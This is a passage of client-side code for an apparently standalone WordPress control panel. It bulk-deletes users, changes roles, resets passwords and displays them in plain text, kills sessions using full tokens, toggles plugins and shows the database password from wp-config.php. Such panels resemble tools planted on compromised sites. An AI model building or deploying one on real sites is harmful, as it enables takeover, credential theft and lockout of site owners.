        confirmButtonColor: '#f2555a'
    });
    if (!isConfirmed) return;

    showLoading(true, 'Deleting...');
    const res = await api('bulk_delete', { ids });
    showLoading(false);

    if (res.ok) { toast(res.msg); await renderUsers(); }
    else Swal.fire('Error', res.err, 'error');
}

async function bulkChangeRole() {
    const ids = getSelectedIds();
    if (!ids.length) return;

    const { value: role } = await Swal.fire({
        title: `Change role for ${ids.length} user`,
        input: 'select',
        inputOptions: ROLES.reduce((a, r) => (a[r] = r, a), {}),
        inputPlaceholder: 'Select role',
        showCancelButton: true,
        confirmButtonText: 'Change'
    });
    if (!role) return;

    showLoading(true, 'Updating...');
    const res = await api('bulk_change_role', { ids, role });
    showLoading(false);

    if (res.ok) { toast(res.msg); await renderUsers(); }
    else Swal.fire('Error', res.err, 'error');
}

async function bulkResetPass() {
    const ids = getSelectedIds();
    if (!ids.length) return;

    const { isConfirmed } = await Swal.fire({
        title: `Reset password for ${ids.length} user?`,
        text: 'Password baru akan digenerate random.',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Reset All',
        confirmButtonColor: '#e6a93b'
    });
    if (!isConfirmed) return;

    showLoading(true, 'Resetting...');
    const res = await api('bulk_reset_pass', { ids });
    showLoading(false);

    if (res.ok && res.results) {
        let html = '<div style="max-height:400px; overflow-y:auto; text-align:left;">';
        res.results.forEach(r => {
            html += `<div style="margin-bottom:10px; padding:10px; background:#0a0e14; border-radius:6px;">
                <div style="font-size:12px; color:#7d8794;">${esc(r.user)}</div>
                <div style="font-family:monospace; font-size:14px; color:#4ec26a;">${esc(r.pass)}</div>
            </div>`;
        });
        html += '</div>';

        Swal.fire({
            title: `${res.results.length} Password Generated`,
            html,
            icon: 'success',
            width: 600,
            confirmButtonText: 'Copy All',
            showCancelButton: true,
            cancelButtonText: 'Close'
        }).then(r => {
            if (r.isConfirmed) {
                const text = res.results.map(x => x.user + ': ' + x.pass).join('\n');
                navigator.clipboard.writeText(text);
                toast('Copied all');
            }
        });

        await renderUsers();
    } else {
        Swal.fire('Error', res.err || 'Unknown', 'error');
    }
}

// ============================================================
// SESSIONS
// ============================================================
async function renderSessions() {
    const res = await api('session_list');
    if (res.err) { view.innerHTML = `<p style="color:var(--err)">${esc(res.err)}</p>`; return; }

    let html = `
        <div class="page-header">
            <h2>Active Sessions</h2>
            <p class="page-desc">Manage active user sessions.</p>
        </div>
        <div class="table-wrap"><table>
            <thead><tr>
                <th>User</th>
                <th>Token</th>
                <th>Login Time</th>
                <th>Expiry</th>
                <th>IP / UA</th>
                <th>Actions</th>
            </tr></thead><tbody>`;

    if (!res.sessions.length) {
        html += `<tr><td colspan="6" style="text-align:center; padding:40px; color:var(--txt-dim);">No active sessions found.</td></tr>`;
    } else {
        res.sessions.forEach(s => {
            const loginTime = s.login ? new Date(s.login * 1000).toLocaleString() : '-';
            const expiry = s.expiration ? new Date(s.expiration * 1000).toLocaleString() : '-';
            const ipua = (s.ip || s.ua)
                ? `${esc(s.ip || '-')}<br><small style="color:var(--txt-dim); font-size:11px;">${esc((s.ua || '-').substring(0, 50))}</small>`
                : '-';

            html += `<tr>
                <td class="user-cell"><b>${esc(s.user_login)}</b></td>
                <td class="date-cell">${esc(s.token)}</td>
                <td class="date-cell">${esc(loginTime)}</td>
                <td class="date-cell">${esc(expiry)}</td>
                <td style="font-size:11.5px;">${ipua}</td>
                <td><div class="actions">
                    <button class="btn btn-sm btn-err" onclick="killSession(${s.user_id}, '${esc(s.token_full)}')">Kill</button>
                    <button class="btn btn-sm btn-warn" onclick="killAllSessions(${s.user_id}, '${esc(s.user_login)}')">Kill All</button>
                </div></td>
            </tr>`;
        });
    }

    view.innerHTML = html + `</tbody></table></div>`;
}

async function killSession(userId, token) {
    const { isConfirmed } = await Swal.fire({
        title: 'Kill Session?',
        text: 'User akan logout dari session ini.',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Kill'
    });
    if (!isConfirmed) return;

    showLoading(true, 'Killing...');
    const res = await api('session_kill', { user_id: userId, token });
    showLoading(false);

    if (res.ok) { toast(res.msg); await renderSessions(); }
    else Swal.fire('Error', res.err, 'error');
}

async function killAllSessions(userId, username) {
    const { isConfirmed } = await Swal.fire({
        title: `Kill all sessions for ${username}?`,
        text: 'User akan logout dari semua device.',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Kill All'
    });
    if (!isConfirmed) return;

    showLoading(true, 'Killing...');
    const res = await api('session_kill_all', { user_id: userId });
    showLoading(false);

    if (res.ok) { toast(res.msg); await renderSessions(); }
    else Swal.fire('Error', res.err, 'error');
}

// ============================================================
// PLUGINS
// ============================================================
async function renderPlug() {
    const res = await api('plug_list');
    if (res.err) { view.innerHTML = `<p style="color:var(--err)">${esc(res.err)}</p>`; return; }

    let html = `
        <div class="page-header">
            <h2>Plugins</h2>
            <p class="page-desc">Activate or deactivate installed extensions.</p>
        </div>
        <div class="table-wrap"><table>
            <thead><tr><th>Plugin</th><th>Status</th><th>Action</th></tr></thead><tbody>`;

    const keys = Object.keys(res.all || {});
    if (!keys.length) {
        html += `<tr><td colspan="3" style="text-align:center; padding:40px; color:var(--txt-dim);">No plugins found.</td></tr>`;
    } else {
        keys.forEach(p => {
            const d = res.all[p];
            const isActive = res.active.includes(p);
            html += `<tr>
                <td><b style="color:var(--h)">${esc(d.Name)}</b><br><small style="color:var(--txt-dim); font-size:11.5px;">Version ${esc(d.Version)}</small></td>
                <td><span class="badge ${isActive ? 'badge-on' : 'badge-off'}">${isActive ? 'Active' : 'Inactive'}</span></td>
                <td><button class="btn btn-sm ${isActive ? 'btn-err' : 'btn-succ'}" onclick="toggleP('${esc(p)}')">${isActive ? 'Deactivate' : 'Activate'}</button></td>
            </tr>`;
        });
    }

    view.innerHTML = html + `</tbody></table></div>`;
}

async function toggleP(p) {
    showLoading(true, 'Updating plugin...');
    const res = await api('plug_toggle', { p });
    showLoading(false);
    if (res.ok) { toast(res.msg); await renderPlug(); }
    else Swal.fire('Error', res.err, 'error');
}

// ============================================================
// DATABASE
// ============================================================
async function renderDB() {
    const r = await api('db_info');
    if (r.err) { view.innerHTML = `<p style="color:var(--err)">${esc(r.err)}</p>`; return; }

    view.innerHTML = `
        <div class="page-header">
            <h2>Database</h2>
            <p class="page-desc">Connection details from wp-config.php</p>
        </div>
        <div class="table-wrap" style="max-width:720px;"><table class="db-table">
            <tr><th>DB Host</th><td>${esc(r.h)}</td></tr>
            <tr><th>DB Name</th><td class="val-accent">${esc(r.n)}</td></tr>
            <tr><th>DB User</th><td>${esc(r.u)}</td></tr>
            <tr><th>DB Password</th><td class="val-err">${esc(r.p)}</td></tr>
            <tr><th>Prefix</th><td>${esc(r.px)}</td></tr>
        </table></div>`;
}

// ============================================================
// INIT
// ============================================================
window.onload = () => {
    const first = document.querySelector('.nav-item.active');
    loadPage('users', first);
};
</script>
</body>
</html>